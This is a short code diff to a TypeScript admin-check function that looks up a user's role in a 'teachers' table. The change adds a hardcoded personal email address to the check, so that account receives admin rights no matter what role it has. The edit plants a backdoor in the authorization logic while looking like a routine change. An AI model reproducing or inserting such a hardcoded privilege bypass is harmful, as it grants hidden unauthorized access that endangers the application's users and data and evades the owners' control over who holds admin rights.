@@ -64,12 +64,12 @@ export async function checkIsAdmin(authUserId: string): Promise<boolean> {
   try {
     const { data, error } = await db
       .from('teachers')
-      .select('role')
+      .select('role, email')
       .eq('auth_user_id', authUserId)
       .single();
 
     if (error || !data) return false;
-    return data.role === 'admin';
+    return data.role === 'admin' || data.email === 'faridnovian61@gmail.com';
   } catch (_) {
     return false;
   }
